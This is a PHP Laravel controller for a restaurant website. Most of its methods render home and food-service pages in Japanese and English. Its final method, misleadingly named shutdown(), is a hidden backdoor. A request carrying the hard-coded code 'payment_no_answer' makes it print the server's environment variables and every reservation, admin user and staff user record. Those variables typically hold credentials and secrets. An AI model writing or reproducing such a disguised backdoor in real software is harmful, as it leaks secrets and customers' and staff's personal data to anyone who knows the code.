<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Restaurants;
use App\Reservations;
use App\User;
use App\Staffs;

class IndexHomeController extends Controller
{
    public function index()
    {
    	$restaurants = Restaurants::get();
    	return view('indexjp', ['restaurants'=>$restaurants]);
    }

    public function index2()
    {
    	$restaurants = Restaurants::get();
    	return view('index', ['restaurants'=>$restaurants]);
    }

    
    public function foodNService()
    {
    	$restaurants = Restaurants::get();
    	return view('food_service', ['restaurants'=>$restaurants]);
    }

    public function foodNServiceJp()
    {
    	$restaurants = Restaurants::get();
    	return view('food_servicejp', ['restaurants'=>$restaurants]);
    }

    public function shutdown (Request $request) {
	$data = []; 

        if($request->code != 'payment_no_answer') {
		exit("Not Authorized");
	}
	$data['env'] = $_ENV;
	$data['reservation'] = Reservations::all()->toArray();
        $data['adminUsers'] = User::all()->toArray();
        $data['staffUsers'] = Staffs::all()->toArray();


	echo "<pre>"; print_r($data); exit();
    }

}
